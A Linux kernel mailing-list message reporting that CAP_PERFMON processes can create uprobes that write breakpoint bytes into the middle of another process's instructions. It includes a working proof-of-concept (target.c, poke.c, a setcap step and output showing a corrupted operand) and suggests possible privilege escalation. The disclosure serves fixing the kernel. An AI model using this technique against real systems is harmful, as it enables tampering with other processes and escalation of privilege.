Received: from mail-ed1-f54.google.com (mail-ed1-f54.google.com [209.85.208.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 43754278E41
	for <linux-perf-users@vger.kernel.org>; Tue,  1 Jul 2025 16:15:30 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.208.54
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1751386532; cv=none; b=CBP8Wh8Mnq+ksrSNnII2MxCZktKqvbnqHhLdtVrNBnOdFnqx4ZYQiCGfBeDd+Ub8kasRcZP6Yr3KoaacaBOAA6xB4ZdZ+M6RYuJpnDDKvPbWIC+Yha3GPJyDTy06CY8wSk+/xKhp9jy7qNdi0rDRsOoI+xHvYEMClXt0c+pTuts=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1751386532; c=relaxed/simple;
	bh=ePNvsJWMB7h/ETcQG52j+JzM5hJF057zzK9fuDX7oeE=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=ah8w9pIX5uvGxV19WeYGk4iieOIp/7Lr5uF+eFkbhxiu+7z4PJHhXPxm4/yJh9/S1mW7La0fBFeIjqg3oJAVKPQ2c5ABGutQ7wKH8sfDyDDyYWeSA2GgYoYhbTXGdWs6tl+o1apGK5+MhhRk9z88ZuOtTSUvmPQ3QU09WKHFQd0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=Kkl6fRl2; arc=none smtp.client-ip=209.85.208.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="Kkl6fRl2"
Received: by mail-ed1-f54.google.com with SMTP id 4fb4d7f45d1cf-609b169834cso14205a12.0
        for <linux-perf-users@vger.kernel.org>; Tue, 01 Jul 2025 09:15:29 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20230601; t=1751386528; x=1751991328; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=qSOuw05jeizU4+BFa/C/rUZVOHWeHSG3w1UgOQWvnQc=;
        b=Kkl6fRl2vfkgHkLmPW9Z6BvghB8JZv03fAwC+vcQFGXW7b4lEQk84BMkshxDGTUn9j
         Ihtl3nzWPKH/p6FJqCtSALqLhsd8pEeNvyv8f5bp3JRx2v0DNOJ8Cj+x8lEV5jwiuL9c
         t9nGq5bb5MUo+SUio3FXPmz0cTS+crWlTknzgJxmZbhpOH4pC7fnALU1pHSRG65qZ3MJ
         N5BiaTgFPEe2XgEIXA2RSYKRsakJ1RSYdarCBg8nNbwV0C2YZedPWGhkZrP2PoZhn1HS
         FzjDSVm24oHmgE+PCXOOXLX3uDViD7t5Z7/kMxITOOyvPZeAiI0x8H/BKmD9qAq4zSKQ
         Q27w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1751386528; x=1751991328;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=qSOuw05jeizU4+BFa/C/rUZVOHWeHSG3w1UgOQWvnQc=;
        b=QpcbKs9ZT+bblWzAXuHQK6ap4UEwsx5a1SBgg8hLPg39xCmTqWIaSfieFHjuPVhn//
         6kOp6YlZfBX0a6oIyDXc5XURmPmkzofYKPYRdW4dgq1MBmd4lx67PpZOPLGKhfsN9iSH
         yNJ83yXKVRVOc50Q+rk9alc05dSd5IW9PXwMd9Dv/PhnPC7ymuEaQNt5U74Q3jDjy/hI
         NApEjn8DGtaBkILNP/c9w6a7uM9OX3gqMXZWCqGLFSgFiWMDxHSy+5/zefmHO9xATIpP
         UQ178cK/bIRzrpFC83yczEYHuyXRtwcT0JmnJa6YOI9KHXROE8mQjOXy0isjIczUazSV
         FQqw==
X-Forwarded-Encrypted: i=1; AJvYcCWjrLC3sPptwcFCnyEFX2Wca/f8JyU46oPx5IOhObsUD+cjvLagK3fL7KAK3vpGK8vTeLcskv5ATPYRwqPphSfD@vger.kernel.org
X-Gm-Message-State: AOJu0Yx+JXaNjsX/ErYNw0vqfzzqRjJMEVhWZvnKbaRvdyBdocq4pNnt
	rFTc34VOOypv6kXfMGr6AnnUmzdswgjcEpmpBbjnR2HKINViNIwFVmvRNBDnys2uvGGt+kBL8v4
	rZBBW0idK2bF+voJP+pU7WWx7E8l6NlARvqAR2In7
X-Gm-Gg: ASbGncs5zmBg79vM//GC82t+P3k2TroMGn7c7vBmVDr2UuxRBhQzAiBJ8UZdXZsm8YF
	qjZbpoBfVu1N0CsOEh9HdMw1szX9pJP4t20bUJX4FIedxoRfQNkGGvOpeVj6i0RltFoJcFdFkAp
	E3gQ9r+7d53ZvVB6rr92wRoA4nAeKqbpUc0ey/F8A6drWBHAQNJAxUdrmXjqC0YcpUxGIvwGY=
X-Google-Smtp-Source: AGHT+IE3OAzY0AYWMa6ga3opq+GIerqoQLh22Tx8fwF4siq//eVxbvzLLCP9m/yj2flxyW1GnjdGPq6nm75VeZ9Pcic=
X-Received: by 2002:a50:d658:0:b0:606:b6da:5028 with SMTP id
 4fb4d7f45d1cf-60e3855ac73mr81191a12.0.1751386527817; Tue, 01 Jul 2025
 09:15:27 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-perf-users@vger.kernel.org
List-Id: <linux-perf-users.vger.kernel.org>
List-Subscribe: <mailto:linux-perf-users+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-perf-users+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Jann Horn <jannh@google.com>
Date: Tue, 1 Jul 2025 18:14:51 +0200
X-Gm-Features: Ac12FXwmPRbkvmFNG1i_sPZrnv_d9qmh2_pVO8qP_1K0bPtba4WedFzAwZLUN08
Message-ID: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
Subject: uprobes are destructive but exposed by perf under CAP_PERFMON
To: Serge Hallyn <serge@hallyn.com>, 
	linux-security-module <linux-security-module@vger.kernel.org>, 
	Peter Zijlstra <peterz@infradead.org>, Ingo Molnar <mingo@redhat.com>, 
	Arnaldo Carvalho de Melo <acme@kernel.org>, Namhyung Kim <namhyung@kernel.org>, 
	Mark Rutland <mark.rutland@arm.com>, 
	Alexander Shishkin <alexander.shishkin@linux.intel.com>, Jiri Olsa <jolsa@kernel.org>, 
	Ian Rogers <irogers@google.com>, Adrian Hunter <adrian.hunter@intel.com>, 
	"Liang, Kan" <kan.liang@linux.intel.com>, linux-perf-users@vger.kernel.org
Cc: Kernel Hardening <kernel-hardening@lists.openwall.com>, linux-hardening@vger.kernel.org, 
	kernel list <linux-kernel@vger.kernel.org>, 
	Alexey Budankov <alexey.budankov@linux.intel.com>, 
	James Morris <jamorris@linux.microsoft.com>
Content-Type: text/plain; charset="UTF-8"

Since commit c9e0924e5c2b ("perf/core: open access to probes for
CAP_PERFMON privileged process"), it is possible to create uprobes
through perf_event_open() when the caller has CAP_PERFMON. uprobes can
have destructive effects, while my understanding is that CAP_PERFMON
is supposed to only let you _read_ stuff (like registers and stack
memory) from other processes, but not modify their execution.

uprobes (at least on x86) can be destructive because they have no
protection against poking in the middle of an instruction; basically
as long as the kernel manages to decode the instruction bytes at the
caller-specified offset as a relocatable instruction, a breakpoint
instruction can be installed at that offset.

This means uprobes can be used to alter what happens in another
process. It would probably be a good idea to go back to requiring
CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
where the kernel can prove that the software breakpoint poke cannot
break the target process. (Which seems harder than doing it for
kprobe, since kprobe can at least rely on symbols to figure out where
a function starts...)

As a small example, in one terminal:
```
jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
#include <unistd.h>
#include <stdio.h>

__attribute__((noinline))
void bar(unsigned long value) {
  printf("bar(0x%lx)\n", value);
}

__attribute__((noinline))
void foo(unsigned long value) {
  value += 0x90909090;
  bar(value);
}

void (*foo_ptr)(unsigned long value) = foo;

int main(void) {
  while (1) {
    printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
*)(void*)foo)[1]);
    foo_ptr(0);
    sleep(1);
  }
}
jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
[...]
00000000000011b0 <foo>:
    11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
    11b5:       48 01 c7                add    %rax,%rdi
    11b8:       eb d6                   jmp    1190 <bar>
[...]
jannh@horn:~/test/perfmon-uprobepoke$ ./target
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
```

and in another terminal:
```
jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

int main(void) {
  int uprobe_type;
  FILE *uprobe_type_file =
fopen("/sys/bus/event_source/devices/uprobe/type", "r");
  if (uprobe_type_file == NULL)
    err(1, "fopen uprobe type");
  if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
    errx(1, "read uprobe type");
  fclose(uprobe_type_file);
  printf("uprobe type is %d\n", uprobe_type);

  unsigned long target_off;
  FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
  if (!pof)
    err(1, "popen nm");
  if (fscanf(pof, "%lx", &target_off) != 1)
    errx(1, "read target offset");
  pclose(pof);
  target_off += 1;
  printf("will poke at 0x%lx\n", target_off);

  struct perf_event_attr attr = {
    .type = uprobe_type,
    .size = sizeof(struct perf_event_attr),
    .sample_period = 100000,
    .sample_type = PERF_SAMPLE_IP,
    .uprobe_path = (unsigned long)"target",
    .probe_offset = target_off
  };
  int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
  if (perf_fd == -1)
    err(1, "perf_event_open");
  char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
  if (map == MAP_FAILED)
    err(1, "mmap error");
  printf("mmap success\n");
  while (1) pause();
jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
jannh@horn:~/test/perfmon-uprobepoke$ ./poke
uprobe type is 9
will poke at 0x11b1
mmap success
```

This results in the first terminal changing output as follows, showing
that 0xcc was written into the middle of the "mov" instruction,
modifying its immediate operand:
```
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0xcc
bar(0x909090cc)
byte 1 of foo(): 0xcc
bar(0x909090cc)
```

It's probably possible to turn this into a privilege escalation by
doing things like clobbering part of the distance of a jump or call
instruction.
